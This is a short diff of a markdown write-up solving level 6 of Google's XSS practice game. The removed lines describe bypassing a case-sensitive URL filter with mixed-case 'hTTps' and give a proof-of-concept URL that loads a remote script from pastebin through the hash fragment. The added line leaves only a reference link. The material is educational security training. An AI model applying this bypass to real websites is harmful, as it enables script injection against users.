@@ -80,10 +80,4 @@ Afterwards the text after the hash is used as the scripts src:
 
       scriptEl.src = url;
 ```
-Have you noticed something about the regexp? No?! Seriously not? Ok. It's not case-sensitive. You can escape it by using hTTps or any other combination. So the final PoC:
-
-https://xss-game.appspot.com/level6/frame#htTps://pastebin.com/raw.php?i=15S5qZs0
-Conclusion
-This was a great game to play with. After all I must say the levels were not that difficult but a really good opportunity to refresh my XSS skills :)
-
-http://blog.dornea.nu/2014/06/02/googles-xss-game-solutions/
+[ref: ](http://blog.dornea.nu/2014/06/02/googles-xss-game-solutions/)
